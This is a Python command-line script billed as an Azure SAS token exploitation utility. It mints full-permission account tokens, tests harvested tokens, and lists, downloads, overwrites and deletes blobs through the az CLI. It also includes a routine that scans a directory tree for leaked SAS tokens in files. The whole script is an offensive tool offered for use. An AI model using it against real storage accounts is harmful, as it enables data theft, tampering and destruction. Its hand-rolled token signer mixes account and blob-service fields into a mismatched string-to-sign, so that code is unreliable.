#!/usr/bin/env python3
"""
Azure SAS Token Injection and Exploitation Tool
Generates, manipulates, and exploits Shared Access Signature tokens.
"""

import argparse
import sys
import json
from datetime import datetime, timedelta
import hashlib
import hmac
import base64
import urllib.parse
from typing import Dict, Optional, List
import subprocess


class SASExploiter:
    """Handles Azure SAS token operations."""
    
    def __init__(self):
        self.storage_account = None
        self.account_key = None
    
    def set_credentials(self, storage_account: str, account_key: str):
        """Set Azure storage credentials."""
        self.storage_account = storage_account
        self.account_key = account_key
    
    def generate_sas_token(self, resource_name: str, 
                          permissions: str = 'racwd',
                          expiry_hours: int = 24) -> str:
        """Generate SAS token for Azure Storage resource."""
        try:
            expiry = (datetime.utcnow() + timedelta(hours=expiry_hours)).isoformat() + 'Z'
            start = (datetime.utcnow() - timedelta(minutes=5)).isoformat() + 'Z'
            
            # SAS token string to sign
            string_to_sign = '\n'.join([
                permissions,
                start,
                expiry,
                f'/blob/{self.storage_account}/{resource_name}',
                '',
                '',
                '2019-02-02',
                'b',
                ''
            ])
            
            # Sign with account key
            key_bytes = base64.b64decode(self.account_key)
            signature = base64.b64encode(
                hmac.new(key_bytes, string_to_sign.encode('utf-8'), 
                        hashlib.sha256).digest()
            ).decode('utf-8')
            
            # Build SAS token
            sas_token = (
                f'sv=2019-02-02'
                f'&se={urllib.parse.quote(expiry)}'
                f'&sr=b'
                f'&sp={permissions}'
                f'&sig={urllib.parse.quote(signature)}'
                f'&ss=b'
                f'&srt=sco'
            )
            
            return sas_token
        except Exception as e:
            print(f'Error generating SAS token: {e}', file=sys.stderr)
        return ''
    
    def extract_sas_from_connection_string(self, 
                                          connection_string: str) -> Dict[str, str]:
        """Extract components from connection string."""
        components = {}
        for part in connection_string.split(';'):
            if '=' in part:
                key, value = part.split('=', 1)
                components[key] = value
        return components
    
    def construct_blob_url_with_sas(self, container: str, blob: str, 
                                    sas_token: str) -> str:
        """Construct full blob URL with SAS token."""
        return f'https://{self.storage_account}.blob.core.windows.net/{container}/{blob}?{sas_token}'
    
    def list_accessible_containers(self, connection_string: str) -> List[str]:
        """List all accessible containers using connection string."""
        try:
            cmd = [
                'az', 'storage', 'container', 'list',
                '--connection-string', connection_string,
                '-o', 'json'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                containers = json.loads(result.stdout)
                return [c['name'] for c in containers]
        except Exception as e:
            print(f'Error listing containers: {e}', file=sys.stderr)
        return []
    
    def list_blobs_in_container(self, connection_string: str, 
                               container: str) -> List[str]:
        """List all blobs in a container."""
        try:
            cmd = [
                'az', 'storage', 'blob', 'list',
                '--container-name', container,
                '--connection-string', connection_string,
                '-o', 'json'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                blobs = json.loads(result.stdout)
                return [b['name'] for b in blobs]
        except Exception as e:
            print(f'Error listing blobs: {e}', file=sys.stderr)
        return []
    
    def download_blob(self, connection_string: str, container: str, 
                     blob_name: str, output_file: str) -> bool:
        """Download blob to file."""
        try:
            cmd = [
                'az', 'storage', 'blob', 'download',
                '--container-name', container,
                '--name', blob_name,
                '--connection-string', connection_string,
                '--file', output_file
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            print(f'Error downloading blob: {e}', file=sys.stderr)
        return False
    
    def upload_blob(self, connection_string: str, container: str, 
                   blob_name: str, file_path: str) -> bool:
        """Upload file as blob."""
        try:
            cmd = [
                'az', 'storage', 'blob', 'upload',
                '--container-name', container,
                '--name', blob_name,
                '--file', file_path,
                '--connection-string', connection_string,
                '--overwrite'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            print(f'Error uploading blob: {e}', file=sys.stderr)
        return False
    
    def delete_blob(self, connection_string: str, container: str, 
                   blob_name: str) -> bool:
        """Delete a blob."""
        try:
            cmd = [
                'az', 'storage', 'blob', 'delete',
                '--container-name', container,
                '--name', blob_name,
                '--connection-string', connection_string
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            print(f'Error deleting blob: {e}', file=sys.stderr)
        return False
    
    def generate_account_sas(self, account_key: str, 
                            account_name: str,
                            permissions: str = 'racwd',
                            services: str = 'bfqt') -> str:
        """Generate account-level SAS token."""
        try:
            cmd = [
                'az', 'storage', 'account', 'generate-sas',
                '--account-name', account_name,
                '--account-key', account_key,
                '--permissions', permissions,
                '--services', services,
                '--resource-types', 'sco',
                '--expiry', (datetime.utcnow() + timedelta(hours=24)).isoformat() + 'Z'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip().strip('"')
        except Exception as e:
            print(f'Error generating account SAS: {e}', file=sys.stderr)
        return ''
    
    def test_sas_token(self, account_name: str, container: str, 
                      sas_token: str) -> bool:
        """Test if SAS token is valid."""
        try:
            cmd = [
                'az', 'storage', 'blob', 'list',
                '--container-name', container,
                '--account-name', account_name,
                '--sas-token', sas_token
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            print(f'Error testing SAS token: {e}', file=sys.stderr)
        return False
    
    def find_sas_tokens_in_files(self, path: str) -> List[str]:
        """Search for SAS tokens in files."""
        import os
        import re
        
        sas_pattern = r'sv=\d{4}-\d{2}-\d{2}&[^&\s]+(?:&[^&\s]+)*'
        found_tokens = []
        
        for root, dirs, files in os.walk(path):
            for file in files:
                try:
                    with open(os.path.join(root, file), 'r', errors='ignore') as f:
                        content = f.read()
                        tokens = re.findall(sas_pattern, content)
                        found_tokens.extend(tokens)
                except:
                    pass
        
        return list(set(found_tokens))
    
    def extract_sas_components(self, sas_token: str) -> Dict[str, str]:
        """Parse SAS token into components."""
        components = {}
        for param in sas_token.split('&'):
            if '=' in param:
                key, value = param.split('=', 1)
                components[urllib.parse.unquote(key)] = urllib.parse.unquote(value)
        return components


def main():
    parser = argparse.ArgumentParser(
        description='Azure SAS token exploitation utility'
    )
    parser.add_argument('--action', 
                       choices=['generate', 'extract', 'test', 'list-containers', 
                               'list-blobs', 'download', 'upload', 'delete', 'parse'],
                       required=True, help='Action to perform')
    parser.add_argument('--connection-string', help='Azure storage connection string')
    parser.add_argument('--account-name', help='Azure storage account name')
    parser.add_argument('--account-key', help='Azure storage account key')
    parser.add_argument('--container', help='Container name')
    parser.add_argument('--blob', help='Blob name')
    parser.add_argument('--sas-token', help='SAS token to manipulate')
    parser.add_argument('--file', help='Local file path')
    parser.add_argument('--permissions', default='racwd', help='SAS permissions')
    parser.add_argument('--expiry-hours', type=int, default=24, help='Token expiry hours')
    
    args = parser.parse_args()
    
    exploiter = SASExploiter()
    
    if args.action == 'generate':
        if args.account_name and args.account_key:
            sas = exploiter.generate_account_sas(args.account_key, args.account_name)
            print(f'SAS Token: {sas}')
    
    elif args.action == 'extract' and args.sas_token:
        components = exploiter.extract_sas_components(args.sas_token)
        print(json.dumps(components, indent=2))
    
    elif args.action == 'test' and args.sas_token and args.account_name and args.container:
        valid = exploiter.test_sas_token(args.account_name, args.container, args.sas_token)
        print(f'Token valid: {valid}')
    
    elif args.action == 'list-containers' and args.connection_string:
        containers = exploiter.list_accessible_containers(args.connection_string)
        for container in containers:
            print(container)
    
    elif args.action == 'list-blobs' and args.connection_string and args.container:
        blobs = exploiter.list_blobs_in_container(args.connection_string, args.container)
        for blob in blobs:
            print(blob)
    
    elif args.action == 'download' and args.connection_string and args.container and args.blob and args.file:
        success = exploiter.download_blob(args.connection_string, args.container, 
                                         args.blob, args.file)
        print(f'Download successful: {success}')
    
    elif args.action == 'upload' and args.connection_string and args.container and args.blob and args.file:
        success = exploiter.upload_blob(args.connection_string, args.container,
                                       args.blob, args.file)
        print(f'Upload successful: {success}')
    
    elif args.action == 'delete' and args.connection_string and args.container and args.blob:
        success = exploiter.delete_blob(args.connection_string, args.container, args.blob)
        print(f'Delete successful: {success}')
    
    elif args.action == 'parse' and args.sas_token:
        components = exploiter.extract_sas_components(args.sas_token)
        for key, value in components.items():
            print(f'{key}: {value}')


if __name__ == '__main__':
    main()
